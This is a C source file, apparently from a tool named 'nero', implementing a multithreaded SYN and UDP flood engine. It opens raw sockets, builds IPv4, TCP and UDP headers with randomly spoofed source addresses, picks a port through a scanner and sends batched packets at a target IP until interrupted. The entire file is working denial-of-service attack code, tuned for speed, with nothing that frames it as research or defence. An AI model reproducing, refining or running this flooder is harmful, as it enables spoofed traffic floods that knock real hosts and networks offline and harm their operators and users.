#if defined(__linux__) && !defined(_GNU_SOURCE)
#define _GNU_SOURCE
#endif
/* Legacy Linux traffic engine. Its worker and signal lifecycle is separate
 * from the shell; macOS production diagnostics are handled in commands.c.
 * Platform build rules decide whether this implementation is linked. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdatomic.h>
#include <netinet/udp.h>  // struct udphdr

#include "nero/portscanner.h"
#include "nero/syn_flood_powered.h"

#include "syn/syn_internal.h"

/* PACKET_SIZE is the datagram buffer ceiling; the operator selects a smaller
 * size at run time through the settings prompt. The worker count is not a
 * compile-time ceiling anymore: the per-run array is sized from the selected
 * value (bounded by NERO_SYN_THREAD_HARD_MAX) and allocated in SYN_Flood(). */
#define PACKET_SIZE NERO_SYN_PACKET_SIZE_MAX

// Global state
static volatile sig_atomic_t row;
static int port_select;

extern volatile sig_atomic_t cli_termination_signal;

static volatile sig_atomic_t stop_flag = 0;

/* Run-time engine settings selected through the pre-start prompt. The worker
 * default is replaced by the hardware suggestion when one is available; the
 * packet default is the historical compile-time value. Both stay within the
 * public header bounds so the datagram buffer always covers the selection. */
static long syn_thread_count = NERO_SYN_THREAD_COUNT;
static long syn_packet_size  = PACKET_SIZE;

/* Number of flood workers still alive.  When the last worker exits (for
 * example because raw sockets could not be opened) the animation thread is
 * released instead of spinning forever. */
static atomic_int active_workers = 0;

static pthread_t animasyon_thread;

// Pseudo-header for TCP/UDP checksum calculation
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t  placeholder;
    uint8_t  protocol;
    uint16_t tcp_length;
};

#if defined(__APPLE__)
/* macOS exposes BSD's struct ip, not Linux's struct iphdr.  Keep the
 * Linux-style field names used by this legacy packet builder local to the
 * implementation so the header is complete when taking its address. */
struct nero_iphdr {
    uint8_t ihl:4;
    uint8_t version:4;
    uint8_t tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};
#else
/* Linux keeps the kernel header's exact layout and endianness handling. */
#define nero_iphdr iphdr
#endif

/* Compile-time sanity check: the kernel expects exactly 20 bytes for IPv4. */
_Static_assert(sizeof(struct nero_iphdr) == 20, "struct iphdr layout mismatch");

/* Darwin's IP_HDRINCL expects ip_len and ip_off in host byte order, while
 * glibc expects network byte order.  These helpers keep both call sites and
 * the IPv4 checksum (which is always computed over wire-format bytes) correct. */
#if defined(__APPLE__)
#define NERO_IP_LEN_SET(iph, value) ((iph)->tot_len = (uint16_t)(value))
#define NERO_IP_LEN_GET(iph) ((int)(iph)->tot_len)
#else
#define NERO_IP_LEN_SET(iph, value) ((iph)->tot_len = htons((uint16_t)(value)))
#define NERO_IP_LEN_GET(iph) ((int)ntohs((iph)->tot_len))
#endif

/* ============================================================
 * ENTROPY, PRNG AND CHECKSUMS
 * ============================================================ */

/* One 64-bit seed from the OS CSPRNG.  /dev/urandom exists on both supported
 * platforms; arc4random_buf is the native Apple fallback.  If neither works
 * several independent sources are mixed so sibling workers cannot start from
 * the same state. */
static uint64_t os_entropy64(void)
{
    uint64_t value = 0;
    int fd = open("/dev/urandom", O_RDONLY | O_CLOEXEC);
    if (fd >= 0) {
        ssize_t got = read(fd, &value, sizeof(value));
        close(fd);
        if (got == (ssize_t)sizeof(value) && value != 0)
            return value;
    }
#if defined(__APPLE__)
    arc4random_buf(&value, sizeof(value));
    if (value != 0)
        return value;
#endif
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    value ^= ((uint64_t)now.tv_sec << 32) ^ (uint64_t)now.tv_nsec;
    value ^= (uint64_t)(uintptr_t)pthread_self();
    value ^= (uint64_t)(uintptr_t)&value;
    return value != 0 ? value : 0x9E3779B97F4A7C15ULL;
}

/* SplitMix64: small, fast and statistically far better than rand_r()'s
 * 15-bit LCG, needing only 8 bytes of per-worker state. */
typedef struct {
    uint64_t state;
} flood_rng;

static inline uint64_t rng_next(flood_rng *rng)
{
    uint64_t z = (rng->state += 0x9E3779B97F4A7C15ULL);
    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
    z = (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
    return z ^ (z >> 31);
}

static inline uint32_t rng_u32(flood_rng *rng)
{
    return (uint32_t)(rng_next(rng) >> 32);
}

static inline uint16_t rng_port(flood_rng *rng)
{
    return (uint16_t)(rng_next(rng) % 65535u + 1u);
}

/* 32-bit spoofed source IP.  The kernel's raw_send_hdrinc rejects zero-net
 * (0.0.0.0/8), loopback (127.0.0.0/8) and multicast/broadcast (224.0.0.0/4
 * and above) sources with EINVAL, so those first octets are skipped. */
static inline uint32_t random_src_ip(flood_rng *rng)
{
    for (;;) {
        uint32_t value = rng_u32(rng);
        uint8_t first = (uint8_t)(value >> 24);
        if (first == 0 || first == 127 || first >= 224)
            continue;
        return htonl(value);
    }
}

/* RFC 1071 incremental one's-complement accumulator.  Words are read in host
 * order, matching the previous checksum() convention, but without copying the
 * payload into a temporary pseudogram. */
static inline uint32_t csum_add(uint32_t sum, const void *data, size_t length)
{
    const unsigned char *bytes = (const unsigned char *)data;
    while (length >= 2) {
        uint16_t word;
        memcpy(&word, bytes, sizeof(word));
        sum += word;
        bytes += 2;
        length -= 2;
    }
    if (length != 0) {
        uint16_t word = 0;
        memcpy(&word, bytes, 1);
        sum += word;
    }
    return sum;
}

static inline uint16_t csum_fold(uint32_t sum)
{
    while ((sum >> 16) != 0)
        sum = (sum & 0xffffu) + (sum >> 16);
    return (uint16_t)~sum;
}

// Signal handler for Ctrl+C: only async-signal-safe calls.
void sigint_handler(int sig) {
    (void)sig;
    stop_flag = 1;
    char seq[32];
    size_t len = 0;
    seq[len++] = '\033';
    seq[len++] = '[';
    int value = row > 0 ? row : 1;
    char digits[12];
    int ndigits = 0;
    do {
        digits[ndigits++] = (char)('0' + value % 10);
        value /= 10;
    } while (value > 0 && ndigits < (int)sizeof(digits));
    while (ndigits > 0 && len < sizeof(seq) - 5)
        seq[len++] = digits[--ndigits];
    seq[len++] = ';';
    seq[len++] = '1';
    seq[len++] = 'H';
    seq[len++] = '\033';
    seq[len++] = '[';
    seq[len++] = 'J';
    (void)write(STDOUT_FILENO, seq, len);
}

/* IPv4 checksum must be computed over the wire representation of the header.
 * On Darwin tot_len is stored in host order, so swap it temporarily. */
static uint16_t ip_header_checksum(struct nero_iphdr *iph) {
#if defined(__APPLE__)
    uint16_t saved = iph->tot_len;
    iph->tot_len = htons(saved);
    uint16_t result = csum_fold(csum_add(0, iph, iph->ihl * 4));
    iph->tot_len = saved;
    return result;
#else
    return csum_fold(csum_add(0, iph, iph->ihl * 4));
#endif
}

/* Runs when a worker exits, whether normally or through pthread_exit(). */
static void flood_worker_cleanup(void *unused)
{
    (void)unused;
    if (atomic_fetch_sub_explicit(&active_workers, 1, memory_order_relaxed) == 1)
        stop_flag = 1;
}

/* ============================================================
 * PACKET TEMPLATES AND BATCHED TRANSMIT
 * ============================================================ */

#define NERO_SYN_TCP_LEN (sizeof(struct nero_iphdr) + sizeof(struct tcphdr))
#define NERO_SYN_UDP_HDR_LEN (sizeof(struct nero_iphdr) + sizeof(struct udphdr))
#define NERO_SYN_BATCH_MAX 32
#define NERO_SYN_BATCH_BYTES (64u * 1024u)

/* Linux batches with sendmmsg(); the BSDs and macOS use one sendmsg() per
 * datagram.  The message container type is hidden behind this typedef so the
 * packet builders stay identical on both paths. */
#if defined(__linux__)
typedef struct mmsghdr nero_mmsg;
#define nero_msg_hdr(msg) (&(msg)->msg_hdr)
#else
typedef struct msghdr nero_mmsg;
#define nero_msg_hdr(msg) (msg)
#endif

typedef struct {
    flood_rng rng;
    int sock_tcp;
    int sock_udp;
    int closes_sockets;
    struct sockaddr_in target;
    int batch;
    int payload_len;
    _Alignas(8) unsigned char tcp_template[NERO_SYN_TCP_LEN];
    _Alignas(8) unsigned char udp_template[NERO_SYN_UDP_HDR_LEN];
    unsigned char *tcp_slots;
    unsigned char *udp_slots;
    unsigned char *payload;
    uint32_t payload_sum;
    struct iovec *tcp_iov;
    struct iovec *udp_iov;
    nero_mmsg *tcp_msgs;
    nero_mmsg *udp_msgs;
} flood_engine;

/* Static header fields are written once.  Each packet only copies the small
 * template and patches the fields that actually vary. */
static void prepare_templates(flood_engine *engine, in_addr_t dest)
{
    memset(engine->tcp_template, 0, sizeof(engine->tcp_template));
    struct nero_iphdr *iph = (struct nero_iphdr *)engine->tcp_template;
    struct tcphdr *tcph =
        (struct tcphdr *)(engine->tcp_template + sizeof(struct nero_iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    NERO_IP_LEN_SET(iph, NERO_SYN_TCP_LEN);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->daddr = dest;
#if defined(__APPLE__)
    tcph->th_dport = htons((uint16_t)port_select);
    tcph->th_off = 5;
    tcph->th_flags = TH_SYN;
#else
    tcph->dest = htons((uint16_t)port_select);
    tcph->doff = 5;
    tcph->syn = 1;
#endif

    memset(engine->udp_template, 0, sizeof(engine->udp_template));
    iph = (struct nero_iphdr *)engine->udp_template;
    struct udphdr *udph =
        (struct udphdr *)(engine->udp_template + sizeof(struct nero_iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    NERO_IP_LEN_SET(iph, NERO_SYN_UDP_HDR_LEN + (size_t)engine->payload_len);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->daddr = dest;
#if defined(__APPLE__)
    udph->uh_dport = htons((uint16_t)port_select);
    udph->uh_ulen =
        htons((uint16_t)(sizeof(struct udphdr) + (size_t)engine->payload_len));
#else
    udph->dest = htons((uint16_t)port_select);
    udph->len =
        htons((uint16_t)(sizeof(struct udphdr) + (size_t)engine->payload_len));
#endif
}

static void build_tcp_packet(flood_engine *engine, unsigned char *slot)
{
    memcpy(slot, engine->tcp_template, NERO_SYN_TCP_LEN);
    struct nero_iphdr *iph = (struct nero_iphdr *)slot;
    struct tcphdr *tcph = (struct tcphdr *)(slot + sizeof(struct nero_iphdr));

    iph->id = htons((uint16_t)rng_next(&engine->rng));
    iph->saddr = random_src_ip(&engine->rng);
#if defined(__APPLE__)
    tcph->th_sport = htons(rng_port(&engine->rng));
    tcph->th_seq = rng_u32(&engine->rng);
    tcph->th_win =
        htons((uint16_t)(32767u + rng_next(&engine->rng) % (65536u - 32767u)));
#else
    tcph->source = htons(rng_port(&engine->rng));
    tcph->seq = rng_u32(&engine->rng);
    tcph->window =
        htons((uint16_t)(32767u + rng_next(&engine->rng) % (65536u - 32767u)));
#endif

    iph->check = ip_header_checksum(iph);

    struct pseudo_header psh;
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons((uint16_t)sizeof(struct tcphdr));

    uint32_t sum = csum_add(0, &psh, sizeof(psh));
    sum = csum_add(sum, tcph, sizeof(struct tcphdr));
    uint16_t check = csum_fold(sum);
#if defined(__APPLE__)
    tcph->th_sum = check;
#else
    tcph->check = check;
#endif
}

static void build_udp_packet(flood_engine *engine, unsigned char *slot)
{
    memcpy(slot, engine->udp_template, NERO_SYN_UDP_HDR_LEN);
    struct nero_iphdr *iph = (struct nero_iphdr *)slot;
    struct udphdr *udph = (struct udphdr *)(slot + sizeof(struct nero_iphdr));

    iph->id = htons((uint16_t)rng_next(&engine->rng));
    iph->saddr = random_src_ip(&engine->rng);
#if defined(__APPLE__)
    udph->uh_sport = htons(rng_port(&engine->rng));
#else
    udph->source = htons(rng_port(&engine->rng));
#endif

    iph->check = ip_header_checksum(iph);

    struct pseudo_header psh;
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.tcp_length =
        htons((uint16_t)(sizeof(struct udphdr) + (size_t)engine->payload_len));

    uint32_t sum = csum_add(0, &psh, sizeof(psh));
    sum = csum_add(sum, udph, sizeof(struct udphdr));
    sum += engine->payload_sum;
    uint16_t check = csum_fold(sum);
    if (check == 0)
        check = 0xffff;  /* zero means "no checksum" for UDP */
#if defined(__APPLE__)
    udph->uh_sum = check;
#else
    udph->check = check;
#endif
}

static void syn_backoff(struct timespec *delay)
{
    nanosleep(delay, NULL);
    long next = delay->tv_nsec * 2;
    delay->tv_nsec = next > 50000000 ? 50000000 : next;
}

/* Sends every queued message, retrying only transient socket pressure and
 * backing off so a full transmit ring does not become a busy spin. */
static void send_batch(int fd, nero_mmsg *msgs, unsigned int count,
                       const char *label,
                       unsigned long *sent, unsigned long *errors)
{
#if defined(__linux__)
    unsigned int offset = 0;
    struct timespec delay = {0, 100000};
    while (offset < count && !stop_flag) {
        int rc = sendmmsg(fd, msgs + offset, count - offset, MSG_DONTWAIT);
        if (rc > 0) {
            *sent += (unsigned long)rc;
            offset += (unsigned int)rc;
            delay.tv_nsec = 100000;
            continue;
        }
        if (rc < 0 && (errno == EAGAIN || errno == EWOULDBLOCK ||
                       errno == ENOBUFS || errno == EINTR)) {
            syn_backoff(&delay);
            continue;
        }
        if (rc < 0) {
            struct timespec pause = {0, 1000000};
            if (*errors == 0)
                perror(label);
            *errors += count - offset;
            nanosleep(&pause, NULL);
        }
        break;
    }
#else
    for (unsigned int i = 0; i < count && !stop_flag; i++) {
        struct timespec delay = {0, 100000};
        for (;;) {
            ssize_t rc = sendmsg(fd, nero_msg_hdr(&msgs[i]), MSG_DONTWAIT);
            if (rc >= 0) {
                (*sent)++;
                break;
            }
            if (errno == EAGAIN || errno == EWOULDBLOCK ||
                errno == ENOBUFS || errno == EINTR) {
                syn_backoff(&delay);
                continue;
            }
            struct timespec pause = {0, 1000000};
            if (*errors == 0)
                perror(label);
            (*errors)++;
            nanosleep(&pause, NULL);
            break;
        }
    }
#endif
}

/* Releases per-worker buffers and sockets.  Safe on a partially initialised
 * engine, including one whose allocation failed. */
static void engine_release(flood_engine *engine)
{
    free(engine->tcp_slots);
    free(engine->udp_slots);
    free(engine->payload);
    free(engine->tcp_iov);
    free(engine->udp_iov);
    free(engine->tcp_msgs);
    free(engine->udp_msgs);
    if (engine->closes_sockets) {
        if (engine->sock_tcp >= 0)
            close(engine->sock_tcp);
        if (engine->sock_udp >= 0)
            close(engine->sock_udp);
    }
}

/* The raw socket pair is shared by every worker: raw sockets carry no
 * per-thread state, so this keeps descriptor use constant (2 for the whole
 * run) instead of 2 per worker.  Called once from SYN_Flood(). */
static int open_flood_sockets(int *sock_tcp, int *sock_udp)
{
    int one = 1;
    int sendbuf = 1 << 20;

    *sock_tcp = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (*sock_tcp < 0) {
        perror("Failed to create TCP socket");
        return -1;
    }
    if (setsockopt(*sock_tcp, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt TCP");
        close(*sock_tcp);
        *sock_tcp = -1;
        return -1;
    }

    *sock_udp = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (*sock_udp < 0) {
        perror("Failed to create UDP socket");
        close(*sock_tcp);
        *sock_tcp = -1;
        return -1;
    }
    if (setsockopt(*sock_udp, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt UDP");
        close(*sock_tcp);
        close(*sock_udp);
        *sock_tcp = -1;
        *sock_udp = -1;
        return -1;
    }

    /* Non-blocking raw sockets plus a larger transmit queue: sendmmsg()
     * returns EAGAIN instead of stalling a worker when the ring is full,
     * and send_batch() backs off briefly. */
    (void)setsockopt(*sock_tcp, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
    (void)setsockopt(*sock_udp, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));

    int flags = fcntl(*sock_tcp, F_GETFL, 0);
    if (flags >= 0)
        (void)fcntl(*sock_tcp, F_SETFL, flags | O_NONBLOCK);
    flags = fcntl(*sock_udp, F_GETFL, 0);
    if (flags >= 0)
        (void)fcntl(*sock_udp, F_SETFL, flags | O_NONBLOCK);

    return 0;
}

typedef struct {
    const char *target_ip;
    int sock_tcp;
    int sock_udp;
} FloodArgs;

// Thread function: continuously send SYN + UDP packets to target IP
static void *flood(void *arg)
{
    const FloodArgs *args = (const FloodArgs *)arg;
    atomic_fetch_add_explicit(&active_workers, 1, memory_order_relaxed);
    pthread_cleanup_push(flood_worker_cleanup, NULL);

    flood_engine engine;
    memset(&engine, 0, sizeof(engine));
    engine.sock_tcp = args->sock_tcp;
    engine.sock_udp = args->sock_udp;
    engine.closes_sockets = 0;
    engine.rng.state = os_entropy64();

    engine.target.sin_family = AF_INET;
#if defined(__APPLE__)
    engine.target.sin_len = sizeof(engine.target);
#endif
    engine.target.sin_port = htons((uint16_t)port_select);
    engine.target.sin_addr.s_addr = inet_addr(args->target_ip);

    engine.payload_len =
        (int)(syn_packet_size - (long)NERO_SYN_UDP_HDR_LEN);
    engine.batch = NERO_SYN_BATCH_MAX;
    while (engine.batch > 1 &&
           (size_t)engine.batch * (size_t)engine.payload_len > NERO_SYN_BATCH_BYTES)
        engine.batch >>= 1;

    engine.tcp_slots = malloc((size_t)engine.batch * NERO_SYN_TCP_LEN);
    engine.udp_slots = malloc((size_t)engine.batch * NERO_SYN_UDP_HDR_LEN);
    engine.tcp_iov = calloc((size_t)engine.batch, sizeof(*engine.tcp_iov));
    engine.udp_iov = calloc((size_t)engine.batch * 2, sizeof(*engine.udp_iov));
    engine.tcp_msgs = calloc((size_t)engine.batch, sizeof(*engine.tcp_msgs));
    engine.udp_msgs = calloc((size_t)engine.batch, sizeof(*engine.udp_msgs));
    engine.payload = malloc((size_t)engine.payload_len);
    if (!engine.tcp_slots || !engine.udp_slots || !engine.tcp_iov ||
        !engine.udp_iov || !engine.tcp_msgs || !engine.udp_msgs ||
        !engine.payload) {
        fprintf(stderr, "Failed to allocate flood packet buffers\n");
        engine_release(&engine);
        pthread_exit(NULL);
    }

    /* One random payload per worker: it is reused for every datagram instead
     * of regenerating thousands of random bytes for each packet. */
    for (int i = 0; i < engine.payload_len; i++)
        engine.payload[i] = (unsigned char)(rng_next(&engine.rng) & 0xffu);
    engine.payload_sum =
        csum_add(0, engine.payload, (size_t)engine.payload_len);

    prepare_templates(&engine, engine.target.sin_addr.s_addr);

    for (int i = 0; i < engine.batch; i++) {
        struct msghdr *tcp_msg = nero_msg_hdr(&engine.tcp_msgs[i]);
        tcp_msg->msg_name = &engine.target;
        tcp_msg->msg_namelen = sizeof(engine.target);
        tcp_msg->msg_iov = &engine.tcp_iov[i];
        tcp_msg->msg_iovlen = 1;
        engine.tcp_iov[i].iov_base =
            engine.tcp_slots + (size_t)i * NERO_SYN_TCP_LEN;
        engine.tcp_iov[i].iov_len = NERO_SYN_TCP_LEN;

        struct msghdr *udp_msg = nero_msg_hdr(&engine.udp_msgs[i]);
        udp_msg->msg_name = &engine.target;
        udp_msg->msg_namelen = sizeof(engine.target);
        udp_msg->msg_iov = &engine.udp_iov[(size_t)i * 2];
        udp_msg->msg_iovlen = 2;
        engine.udp_iov[(size_t)i * 2].iov_base =
            engine.udp_slots + (size_t)i * NERO_SYN_UDP_HDR_LEN;
        engine.udp_iov[(size_t)i * 2].iov_len = NERO_SYN_UDP_HDR_LEN;
        engine.udp_iov[(size_t)i * 2 + 1].iov_base = engine.payload;
        engine.udp_iov[(size_t)i * 2 + 1].iov_len = (size_t)engine.payload_len;
    }

    unsigned long tcp_sent = 0, udp_sent = 0;
    unsigned long tcp_err  = 0, udp_err  = 0;

    while (!stop_flag) {

        for (int i = 0; i < engine.batch; i++)
            build_tcp_packet(&engine,
                             engine.tcp_slots + (size_t)i * NERO_SYN_TCP_LEN);
        send_batch(engine.sock_tcp, engine.tcp_msgs,
                   (unsigned int)engine.batch, "send tcp",
                   &tcp_sent, &tcp_err);

        if (stop_flag)
            break;

        for (int i = 0; i < engine.batch; i++)
            build_udp_packet(&engine,
                             engine.udp_slots + (size_t)i * NERO_SYN_UDP_HDR_LEN);
        send_batch(engine.sock_udp, engine.udp_msgs,
                   (unsigned int)engine.batch, "send udp",
                   &udp_sent, &udp_err);
    }

    if (tcp_err || udp_err || tcp_sent || udp_sent) {
        nero_syn_report_worker_summary((void *)pthread_self(), tcp_sent,
                                       udp_sent, tcp_err, udp_err);
    }

    engine_release(&engine);
    pthread_cleanup_pop(1);
    return NULL;
}

static int port_get(const char *target_ip){
    int selected = portscanner(target_ip);
    if (selected < 0) {
        nero_syn_report_port_aborted();
        return -1;
    }
    if (selected == 0) {
        /* Keep packet transmission available even when the discovery scan
         * finds no listening port: fall back to the standard HTTP port. */
        port_select = 80;
        nero_syn_report_no_open_port(target_ip);
        return 0;
    }
    port_select = selected;
    return 0;
}

// Starts the selected number of flood workers against the provided target IP
int SYN_Flood(const char *target_ip) {
    stop_flag = 0;
    atomic_init(&active_workers, 0);

    if (!nero_syn_preflight_privileges())
        return 1;

    /* Settings are picked before the port selection and before any worker is
     * spawned; cancelling here leaves the system untouched. */
    if (nero_syn_prompt_settings(&syn_thread_count, &syn_packet_size) != 0) {
        nero_syn_report_cancelled();
        return 1;
    }

    if (port_get(target_ip) != 0)
        return 1;

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigint_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;

    /* Reachability is advisory: ICMP may be filtered even when the target is
     * up, so never block packet transmission because of it. */
    if (!nero_syn_target_is_online(target_ip, &cli_termination_signal))
        nero_syn_report_target_unreachable(target_ip);
    if (cli_termination_signal) return 1;

    struct sigaction previous_sa;
    if (sigaction(SIGINT, &sa, &previous_sa) == -1) {
        perror("sigaction");
        return 1;
    }

    /* The worker count is selected at run time, so the handle array is sized
     * per run instead of using a fixed 512-slot static array. */
    pthread_t *threads = calloc((size_t)syn_thread_count, sizeof(*threads));
    if (threads == NULL) {
        nero_syn_report_thread_alloc_failed(syn_thread_count);
        sigaction(SIGINT, &previous_sa, NULL);
        return 1;
    }

    FloodArgs args;
    args.target_ip = target_ip;
    args.sock_tcp = -1;
    args.sock_udp = -1;
    if (open_flood_sockets(&args.sock_tcp, &args.sock_udp) != 0) {
        free(threads);
        sigaction(SIGINT, &previous_sa, NULL);
        return 1;
    }

    nero_syn_animation_view view;
    view.target_ip = target_ip;
    view.port = port_select;
    view.thread_count = syn_thread_count;
    view.stop_flag = &stop_flag;
    view.row = &row;

    if (pthread_create(&animasyon_thread, NULL, nero_syn_animation_main,
                       &view) != 0) {
        nero_syn_report_animation_failed();
        close(args.sock_tcp);
        close(args.sock_udp);
        free(threads);
        sigaction(SIGINT, &previous_sa, NULL);
        return 1;
    }

    int threads_created = 0;
    for (int i = 0; i < (int)syn_thread_count; i++) {
        if (pthread_create(&threads[i], NULL, flood, &args) != 0) {
            nero_syn_report_thread_start_failed(i);
            break;
        }
        threads_created++;
    }

    if (threads_created == 0)
        stop_flag = 1;
    for (int i = 0; i < threads_created; i++)
        pthread_join(threads[i], NULL);
    pthread_join(animasyon_thread, NULL);
    sigaction(SIGINT, &previous_sa, NULL);
    close(args.sock_tcp);
    close(args.sock_udp);
    free(threads);
    nero_syn_report_stopped();

    if (threads_created != (int)syn_thread_count) {
        nero_syn_report_incomplete(threads_created, syn_thread_count);
        return 1;
    }

    return 0;
}
